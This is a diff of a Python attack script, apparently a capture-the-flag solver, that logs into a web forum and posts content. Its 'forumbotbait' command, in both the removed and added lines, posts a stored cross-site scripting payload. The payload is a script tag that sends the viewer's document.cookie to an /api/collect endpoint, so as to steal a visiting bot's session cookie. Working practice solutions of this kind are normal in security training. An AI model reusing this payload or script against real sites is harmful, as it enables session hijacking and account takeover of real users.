@@ -2,7 +2,7 @@
 #get bot cookie through newsletter.
 import sys
 import requests
-from bs4 import BeautifulSoup
+
 
 GREEN = "\033[92m"
 RED = "\033[91m"
@@ -69,8 +69,6 @@ def post_forum(cookies, title, content):
         cookies=cookies,
         allow_redirects=False
     )
-    botbait = "title = forumbotbait content = <script>fetch(`/api/collect?c=${encodeURIComponent(document.cookie)}`);</script>"
-    print("posting botbait: " + botbait)
     print("Status:", r.status_code)
     print(r.text[:500])
 
@@ -112,10 +110,13 @@ def main():
     elif cmd == "forum":
         cookies = login()
         post_forum(cookies, sys.argv[2], sys.argv[3])
+        print("posting into forum: title " + sys.argv[2] + "content: " + sys.argv[3])
 
     elif cmd == "forumbotbait":
         cookies = login()
-        post_forum(cookies, "forumbotbait","<script>fetch(`/api/collect?c=${encodeURIComponent(document.cookie)}`);</script>" )
+        botbait = "title = forumbotbait, content = <script>fetch(`/api/collect?c=${encodeURIComponent(document.cookie)}`);</script>"
+        post_forum(cookies, "botbait", botbait )
+        print("posting botbait: " + botbait)
 
     elif cmd == "flag":
         findflag()
